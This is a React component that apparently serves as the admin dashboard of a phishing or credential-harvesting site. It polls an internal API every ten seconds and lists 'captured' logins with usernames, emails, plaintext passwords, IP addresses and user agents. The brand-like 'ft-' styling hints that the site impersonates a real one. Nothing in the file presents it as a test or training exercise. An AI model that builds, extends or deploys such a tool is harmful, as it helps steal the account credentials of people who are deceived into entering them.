"use client";

import { useEffect, useState, useCallback } from "react";
import type { LoginCredential } from "@/lib/supabase";

export default function CredentialsTable() {
  const [credentials, setCredentials] = useState<LoginCredential[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");

  const fetchCredentials = useCallback(async () => {
    try {
      const res = await fetch("/api/admin/credentials");
      if (!res.ok) throw new Error("Failed to fetch");
      const data = await res.json();
      setCredentials(data.credentials || []);
      setError("");
    } catch {
      setError("Failed to load credentials");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchCredentials();
    const interval = setInterval(fetchCredentials, 10000);
    return () => clearInterval(interval);
  }, [fetchCredentials]);

  if (loading) {
    return <p className="text-[13px] text-ft-muted">Loading...</p>;
  }

  if (error) {
    return <p className="text-[13px] text-red-600">{error}</p>;
  }

  if (credentials.length === 0) {
    return (
      <div className="bg-white border border-ft-border p-8 text-center">
        <p className="text-[14px] text-ft-muted">No credentials captured yet.</p>
      </div>
    );
  }

  return (
    <div className="bg-white border border-ft-border overflow-x-auto">
      <table className="w-full text-[13px]">
        <thead>
          <tr className="bg-ft-light-gray border-b border-ft-border">
            <th className="text-left p-3 font-bold">Date</th>
            <th className="text-left p-3 font-bold">Page</th>
            <th className="text-left p-3 font-bold">Username</th>
            <th className="text-left p-3 font-bold">Email</th>
            <th className="text-left p-3 font-bold">Password</th>
            <th className="text-left p-3 font-bold">IP Address</th>
            <th className="text-left p-3 font-bold">User Agent</th>
          </tr>
        </thead>
        <tbody>
          {credentials.map((cred) => (
            <tr key={cred.id} className="border-b border-ft-border hover:bg-ft-light-gray/50">
              <td className="p-3 whitespace-nowrap text-ft-muted">
                {new Date(cred.created_at).toLocaleString()}
              </td>
              <td className="p-3">
                <span className="ft-category">{cred.page || "login"}</span>
              </td>
              <td className="p-3 font-medium">{cred.username || "—"}</td>
              <td className="p-3">{cred.email || "—"}</td>
              <td className="p-3 font-mono text-[12px] bg-yellow-50">{cred.password}</td>
              <td className="p-3 text-ft-muted">{cred.ip_address || "—"}</td>
              <td className="p-3 text-ft-muted max-w-[200px] truncate" title={cred.user_agent || ""}>
                {cred.user_agent || "—"}
              </td>
            </tr>
          ))}
        </tbody>
      </table>
      <div className="p-3 border-t border-ft-border flex items-center justify-between">
        <span className="text-[12px] text-ft-muted">
          {credentials.length} record{credentials.length !== 1 ? "s" : ""}
        </span>
        <button onClick={fetchCredentials} className="text-[12px] text-ft-red hover:underline">
          Refresh
        </button>
      </div>
    </div>
  );
}
